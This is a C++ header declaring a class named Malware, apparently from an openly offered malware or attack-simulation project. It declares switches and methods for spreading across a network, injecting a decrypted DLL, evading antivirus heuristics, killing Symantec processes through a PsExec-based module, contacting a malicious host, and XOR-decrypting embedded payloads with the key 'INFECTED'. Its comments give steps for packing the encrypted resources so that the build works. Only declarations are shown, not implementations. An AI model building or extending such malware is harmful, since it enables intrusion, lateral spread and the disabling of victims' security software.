#pragma once
#include <iostream>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <fstream>
#define MAX_BUFFER	500
#define KEY	"INFECTED"

class Malware
{
public:
	Malware();
	Malware(bool, bool, bool, bool, bool, bool);
	bool execute();
	~Malware();
private:
	bool spreadInNetwork;
	bool injectDll;

	/* Bypassing Antivirus Heuristic Scan: https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf */
	bool evadeAntiVirus;

	/* Killing Symantec AV process with the psExecHandler module that attached as a resource - Could be dangerous*/
	bool KillAntiVirus;
	bool connectToMaliciousHost;
	bool eicar;
	bool sendPacketToIP(char*, int);
	bool sendPacketToDomain(std::string, int);

	/*
	Decrypts the DLL that attached as a resource using the same algorithm as here:
	https://github.com/gilmansharov/File-Encryptor-Decryptor
	and after that, saves the decrypted DLL

	YOU NEED TO CREATE THIS ENCRYPTED DLL AND SAVE IT AS A RESOURCE, IF NOT, THE MALWARE WON'T COMPILE AND RUN.
	THE ENCRYPTION SHOULD BE WITH THE FILE-ENCRYPTOR-DECRYPTOR TOOL (A LINK IS 3 LINES BEFORE THAT LINE) AND WITH THE KEY IN THE MACRO
	(IN THIS CASE, THE KEY IS "INFECTED").
	SAVE IT AS IDR_RCDATA1 AS IT'S NAME
	*/
	void createFileAndGetPathOfDll(char*, const char*);

	/*
	Decrypts the PsExecHandler file (network spreading and AV killing module) that attached as a resource using the same algorithm as here:
	https://github.com/gilmansharov/File-Encryptor-Decryptor
	and after that, saves the decrypted File

	YOU NEED TO CREATE THIS ENCRYPTED PSEXECHANDLER FILE AND SAVE IT AS A RESOURCE, IF NOT, THE MALWARE WON'T COMPILE AND RUN.
	THE ENCRYPTION SHOULD BE WITH THE FILE-ENCRYPTOR-DECRYPTOR TOOL (A LINK IS 3 LINES BEFORE THAT LINE) AND WITH THE KEY IN THE MACRO
	(IN THIS CASE, THE KEY IS "INFECTED").
	SAVE IT AS IDR_RCDATA2 AS IT'S NAME
	*/
	void createFileAndGetPathOfPsExec(char*, const char*);

	/* Decrypting a buffer using the same algorithm used in my Encryptor-Decryptor-Tool here: https://github.com/gilmansharov/File-Encryptor-Decryptor*/
	void xorCrypt(char*, unsigned int, const char*);
	/*Injects the dll that attached as a resource (after decryption) */
	bool execInjection(int, char*);
};

